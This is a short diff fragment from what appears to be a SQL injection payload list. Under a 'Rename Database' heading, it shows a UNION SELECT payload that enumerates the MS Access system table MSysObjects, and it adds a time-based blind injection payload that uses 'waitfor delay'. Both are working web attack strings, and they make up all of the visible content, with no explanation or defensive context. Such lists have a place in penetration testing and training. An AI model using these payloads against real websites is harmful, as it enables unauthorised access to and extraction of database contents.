@@ -7,3 +7,6 @@
 
 # Rename Database
 1' UNION SELECT Name, DBEngine.Name,  NULL,NULL, NULL, NULL, NULL, NULL,NULL, NULL from MSysObjects
+
+
+1'; waitfor delay '0:0:5'--#
